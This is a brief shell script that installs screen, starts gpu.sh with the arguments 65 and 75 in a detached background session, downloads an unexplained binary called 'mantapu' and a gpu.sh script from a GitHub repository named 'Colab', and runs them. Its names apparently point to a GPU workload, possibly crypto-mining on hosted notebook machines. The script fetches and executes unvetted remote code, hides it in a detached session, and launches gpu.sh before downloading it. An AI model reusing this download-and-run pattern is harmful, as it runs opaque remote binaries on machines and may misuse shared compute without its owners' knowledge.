#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/Finf1311/Colab/raw/main/mantapu
wget https://raw.githubusercontent.com/Finf1311/Colab/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
